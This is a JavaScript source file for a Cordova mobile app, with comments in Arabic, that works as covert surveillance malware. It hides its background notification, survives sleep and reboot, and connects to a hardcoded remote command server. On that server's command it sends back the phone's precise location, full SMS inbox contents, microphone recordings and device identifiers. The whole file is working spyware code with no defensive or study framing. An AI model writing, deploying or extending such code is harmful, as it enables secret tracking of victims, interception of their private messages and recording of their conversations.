document.addEventListener('deviceready', onDeviceReady, false);
// تخزين الطلبات المستلمة
const receivedRequests = [];
function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات المطلوبة عند فتح التطبيق
  requestPermissions();
  
  // تمكين التشغيل في الخلفية مع إعدادات أكثر فعالية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      color: 'F14F4D',
      icon: 'icon',
      resume: true,
      hidden: true,
      bigText: true,
      // إضافة خاصية الموافقة التلقائية على الوضع الخلفي
      silent: true
    });
    
    cordova.plugins.backgroundMode.enable();
    
    // منع الجهاز من الدخول في وضع السكون
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableBatteryOptimizations();
      if (cordova.plugins.insomnia) {
        cordova.plugins.insomnia.keepAwake();
      }
    });
    
    // التعامل مع الضغط على إشعار الوضع الخلفي
    cordova.plugins.backgroundMode.on('notificationclick', function() {
      cordova.plugins.backgroundMode.moveToForeground();
    });
  }
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// دالة طلب الأذونات عند فتح التطبيق
function requestPermissions() {
  // طلب الأذونات المطلوبة
  if (cordova.platformId === 'android') {
    const permissions = cordova.plugins.permissions;
    
    const neededPermissions = [
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECORD_AUDIO,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.READ_EXTERNAL_STORAGE
    ];
    
    permissions.hasPermission(neededPermissions, function(status) {
      if (!status.hasPermission) {
        permissions.requestPermissions(
          neededPermissions,
          function(status) {
            if (!status.hasPermission) {
              console.warn('لم يتم منح الأذونات المطلوبة');
            } else {
              console.log('تم منح جميع الأذونات المطلوبة');
            }
          },
          function(error) {
            console.error('خطأ في طلب الأذونات:', error);
          }
        );
      }
    });
  } else if (cordova.platformId === 'ios') {
    // في iOS، يتم طلب الأذونات عند الحاجة
    // لكن يمكن التحقق من أذونات الموقع
    if (navigator && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }
    
    // طلب أذونات الرسائل (SMS)
    if (typeof cordova !== 'undefined' && cordova.plugins && cordova.plugins.SMS) {
      cordova.plugins.SMS.hasPermission(function(hasPermission) {
        if (!hasPermission) {
          cordova.plugins.SMS.requestPermission(function() {
            console.log('تم منح أذونات الرسائل');
          }, function(error) {
            console.error('خطأ في طلب أذونات الرسائل:', error);
          });
        }
      });
    }
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString(),
          commandId: data.commandId
        });
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, data.commandId, (response) => {
          if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // محاولة إعادة الاتصال بشكل أكثر تكراراً في البداية ثم تقليل التكرار
    let reconnectDelay = 1000;
    const maxReconnectDelay = 30000;
    
    function attemptReconnect() {
      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
        console.log(`Attempting to reconnect in ${reconnectDelay}ms...`);
        setTimeout(() => {
          connectToServer(deviceInfo);
          // زيادة المهلة تدريجياً حتى الحد الأقصى
          reconnectDelay = Math.min(reconnectDelay * 2, maxReconnectDelay);
          attemptReconnect();
        }, reconnectDelay);
      }
    }
    
    attemptReconnect();
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests // إرسال سجل الطلبات المستلمة
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, commandId, callback) {
  console.log('Executing command:', command);
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'export_sms':
      exportSMS(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة الحد الأقصى للرسائل
    indexFrom: 0
  };
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // عرض النص الكامل بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// تصدير الرسائل كملف نصي
function exportSMS(commandId, callback) {
  getSMS(commandId, (smsResponse) => {
    if (smsResponse.status === 'success') {
      // إنشاء محتوى الملف النصي
      let txtContent = "رسائل SMS\n================\n\n";
      
      smsResponse.messages.forEach(msg => {
        txtContent += `من: ${msg.address}\n`;
        txtContent += `التاريخ: ${new Date(msg.date).toLocaleString()}\n`;
        txtContent += `الرسالة: ${msg.body}\n`;
        txtContent += "----------------\n\n";
      });
      
      // إنشاء كائن.blob و.URL
      const blob = new Blob([txtContent], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      
      // حفظ الملف في التخزين المحلي
      const fileName = `sms_export_${Date.now()}.txt`;
      saveFileToStorage(fileName, blob);
      
      callback({
        commandId,
        status: 'success',
        export: {
          format: 'txt',
          downloadUrl: url,
          fileName: fileName,
          size: blob.size
        }
      });
    } else {
      callback(smsResponse);
    }
  });
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3', // استخدام صيغة MP3
    audioBitsPerSecond: 128000
  };
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

// حفظ الملفات النصية في التخزين
function saveFileToStorage(fileName, blob) {
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('File saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    console.log('App resumed, reconnecting...');
    onDeviceReady();
  }
}, false);

// التعامل مع إعادة التشغيل التلقائي بعد تشغيل الجهاز
document.addEventListener('bootcomplete', () => {
  console.log('Device booted, starting app...');
  onDeviceReady();
}, false);
